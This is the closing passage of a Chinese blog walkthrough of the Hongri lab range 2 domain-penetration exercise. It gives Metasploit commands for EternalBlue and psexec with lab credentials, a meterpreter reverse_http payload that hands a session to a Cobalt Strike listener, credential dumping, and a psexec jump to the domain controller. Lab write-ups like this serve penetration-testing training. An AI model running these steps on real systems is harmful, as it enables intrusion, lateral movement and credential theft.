+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set RHOSTS 10.10.10.201</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803134559161.png"></p>
+<p>尝试直接psexec横向移动，利用失败</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOSTS 10.10.10.201</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set SMBPass 1qaz@WSX</span><br><span class="line">set SMBDomain DE1AY</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803194339654.png"></p>
+<p>只好联动metasploit上线cs试试</p>
+<p>启动服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teamserver 192.168.132.133 rev1ve</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803140752989.png"></p>
+<p>然后启动客户端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>
+
+<p>创建监听器，监听本地1028端口</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803140910385.png"></p>
+<p>在metasploit把shell弹到cs上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost 192.168.132.133</span><br><span class="line">set lport 1028</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>成功上线cs，然后选择刚刚的监听器进行提权</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803195135476.png"></p>
+<p>我们先进行端口扫描不然视图没有<code>10.10.10.201</code>的IP地址，然后抓取Hash和明文密码</p>
+<p>接着创建SMB监听器，在左上角点击显示目标。选择域控主机点击<code>jump =&gt; psexec</code></p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803195918584.png"></p>
+<p>填写信息，选择我们刚刚创建的SMB监听器以及SYSTEM权限的shell</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803200249965.png"></p>
+<p>成功上线域控主机</p>
+<p><img src="/article/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20240803200338831.png"></p>
+<hr>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>环境搭建：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45780190/article/details/123156086">https://blog.csdn.net/qq_45780190/article/details/123156086</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+              <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag"># 域渗透</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/Editorial-HackTheBox.html" rel="prev" title="Editorial">
+      <i class="fa fa-chevron-left"></i> Editorial
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/%E5%BB%BA%E7%AB%8B%E5%85%B1%E4%BA%AB%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6.html" rel="next" title="建立共享获取敏感文件">
+      建立共享获取敏感文件 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2"><span class="nav-number">1.</span> <span class="nav-text">红日靶场2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9B%BE"><span class="nav-number">1.1.1.</span> <span class="nav-text">网络拓扑图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E7%BD%91%E6%AE%B5"><span class="nav-number">1.1.2.</span> <span class="nav-text">配置网段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AEDC%E5%9F%9F%E6%8E%A7"><span class="nav-number">1.1.3.</span> <span class="nav-text">配置DC域控</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AEPC"><span class="nav-number">1.1.4.</span> <span class="nav-text">配置PC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AEWEB"><span class="nav-number">1.1.5.</span> <span class="nav-text">配置WEB</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">1.3.</span> <span class="nav-text">外网打点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.4.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">1.5.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.5.1.</span> <span class="nav-text">本机信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E9%80%82%E9%85%8D%E5%99%A8"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">查看网络适配器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">查看本地用户信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">查看本地管理员组</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.5.2.</span> <span class="nav-text">域内信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">查看是否存在域环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">查看域用户信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%94%A8%E6%88%B7%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="nav-number">1.5.2.3.</span> <span class="nav-text">查看域用户组信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%BB%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="nav-number">1.5.2.4.</span> <span class="nav-text">查看主域控制器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9A%E4%BD%8D%E4%B8%BB%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="nav-number">1.5.2.5.</span> <span class="nav-text">定位主域控制器</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">1.5.3.</span> <span class="nav-text">探测内网存活主机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86"><span class="nav-number">1.5.4.</span> <span class="nav-text">用户凭据收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%93%E5%8F%96Hash"><span class="nav-number">1.5.4.1.</span> <span class="nav-text">抓取Hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="nav-number">1.5.4.2.</span> <span class="nav-text">抓取明文密码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">1.5.5.</span> <span class="nav-text">内网横向移动</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.6.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
